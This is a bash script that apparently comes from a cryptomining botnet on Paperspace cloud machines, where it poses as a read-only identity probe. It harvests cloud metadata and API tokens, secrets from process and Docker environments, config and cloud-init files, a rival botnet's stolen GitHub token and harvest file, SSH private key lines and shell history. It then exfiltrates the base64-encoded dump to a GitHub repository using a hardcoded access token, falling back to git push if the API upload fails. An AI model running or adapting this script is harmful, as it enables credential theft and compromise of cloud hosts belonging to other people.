#!/bin/bash
# i440 provider-identity probe for Paperspace machines (read-only; does not touch the miner)
set -u
GH=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
REPO=dongsuju/ul-plant
H=$(hostname -s)
O=/tmp/i440_$$.txt
{
echo "=== i440 IDENT host=$H ts=$(date -u +%FT%TZ)"
id 2>&1; hostname 2>&1; cat /etc/machine-id 2>&1
echo "=== nvidia-smi"
nvidia-smi -L 2>&1 | head -10
echo "=== ps-meta"
for u in https://metadata.paperspace.com/meta-data/machine https://metadata.paperspace.com/script http://metadata.paperspace.com/meta-data/machine http://169.254.169.254/metadata/v1/ http://169.254.169.254/latest/meta-data/; do
  echo "## GET $u"; curl -sk -m 8 "$u" 2>&1 | head -c 8000; echo; done
echo "=== ps-proc-env"
for p in $(pgrep -f 'paperspace|gradient|ps-guest|ps-agent' 2>/dev/null | head -8); do
  echo "## pid $p cmd=$(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null | head -c 200)"
  tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -iE 'PAPERSPACE|PS_|GRADIENT|TOKEN|KEY|SECRET|API|AWS|AZURE' | head -20
done
echo "=== ps-files"
for f in /home/paperspace/.paperspace/config.json /root/.paperspace/config.json /home/paperspace/.config/paperspace/config.json /home/paperspace/.gradient/config.json /var/lib/paperspace/config.json /etc/paperspace/config.json /home/paperspace/.local/share/paperspace/config.json; do
  [ -f "$f" ] && { echo "## $f"; head -c 4000 "$f"; echo; }; done
for d in /var/lib/paperspace /etc/paperspace /opt/paperspace /usr/local/paperspace /home/paperspace/.paperspace /root/.paperspace; do
  [ -e "$d" ] && { echo "## ls $d"; ls -laR "$d" 2>&1 | head -40; }; done
echo "=== cloud-init"
for f in /var/lib/cloud/instance/user-data.txt /var/lib/cloud/instance/vendor-data.txt /var/lib/cloud/instance/obj.pkl /var/log/startup-script-output.log; do
  [ -f "$f" ] && { echo "## $f"; strings "$f" 2>/dev/null | head -c 4000; echo; }; done
echo "=== docker-env"
if command -v docker >/dev/null 2>&1; then
  docker ps -a --format '{{.ID}} {{.Names}} {{.Image}} {{.Status}}' 2>&1 | head -20
  for c in $(docker ps -aq 2>/dev/null | head -10); do
    echo "## container $c"
    docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$c" 2>/dev/null | grep -iE 'PAPERSPACE|PS_|GRADIENT|TOKEN|KEY|SECRET|API|AWS|AZURE|HF_' | head -20
    docker inspect -f '{{range .Mounts}}{{println .Source "->" .Destination}}{{end}}' "$c" 2>/dev/null | head -10
  done
fi
echo "=== rival"
ls -la /opt/fleet.RIVAL.* 2>&1 | head -10
for f in /opt/fleet.RIVAL.*/gh_token /opt/fleet.RIVAL.*/harvest.txt /opt/fleet.RIVAL.*/ps8_install.sh /opt/fleet.RIVAL.*/bin/ps_kit.sh /opt/fleet.RIVAL.*/bin/ps_hb.sh; do
  [ -f "$f" ] && { echo "## $f"; head -c 5000 "$f"; echo; }; done
echo "=== ssh"
ls -la /root/.ssh /home/paperspace/.ssh 2>&1 | head -20
for k in /root/.ssh/id_* /home/paperspace/.ssh/id_*; do [ -f "$k" ] && { echo "## $k"; head -2 "$k"; }; done
echo "=== history"
tail -30 /home/paperspace/.bash_history 2>/dev/null; tail -20 /root/.bash_history 2>/dev/null
echo "=== END"
} > "$O" 2>&1
b=$(base64 -w0 < "$O" 2>/dev/null)
sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/$REPO/contents/cmdout8/$H.txt" | python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("sha",""))
except Exception: print("")' 2>/dev/null)
if [ -n "$sha" ]; then body="{\"message\":\"i440 ident $H\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else body="{\"message\":\"i440 ident $H\",\"content\":\"$b\"}"; fi
for i in 1 2 3; do
  code=$(curl -s -m 60 -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$body" "https://api.github.com/repos/$REPO/contents/cmdout8/$H.txt")
  echo "push attempt $i code=$code" >> "$O"
  case "$code" in 200|201) ok=1; break;; esac
  sleep 6
done
if [ "${ok:-0}" != 1 ]; then
  T=$(mktemp -d) || T=/tmp/i440git$$
  timeout 120 git clone -q "https://x-access-token:$GH@github.com/$REPO.git" "$T" 2>/dev/null && \
    { cp -f "$O" "$T/cmdout8/$H.txt"; cd "$T" && git add -A && \
      git -c user.email=ul@x -c user.name=ul commit -qm "i440 ident $H" 2>/dev/null; \
      timeout 120 git push -q origin main 2>/dev/null; } 
fi
